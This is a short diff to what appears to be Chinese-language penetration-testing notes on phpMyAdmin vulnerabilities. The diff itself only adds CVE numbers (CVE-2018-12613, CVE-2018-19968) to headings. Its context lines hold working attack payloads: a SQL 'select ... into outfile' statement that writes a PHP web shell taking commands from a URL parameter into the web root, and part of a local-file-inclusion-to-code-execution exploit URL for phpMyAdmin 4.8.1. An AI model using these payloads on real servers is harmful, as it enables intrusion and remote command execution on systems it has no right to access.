@@ -8,7 +8,7 @@ select "<?php system($_GET['cmd']);?>" into outfile "/var/www/html/getshell.php"
 - 是union注入(如果是注入的话)
 
 
-# 本地文件包含Version: 4.8.0, 4.8.1
+# CVE-2018-12613 本地文件包含Version: 4.8.0, 4.8.1
 https://www.exploit-db.com/exploits/40185
 ```
 # Exploit Title: phpMyAdmin 4.8.1 - Local File Inclusion to Remote Code Execution
@@ -26,5 +26,5 @@ http://1a23009a9c9e959d9c70932bb9f634eb.vsplate.me/index.php?target=db_sql.php%2
 ```
 
 
-# CVE-2018-19968
+# CVE-2018-19968 文件包含
 
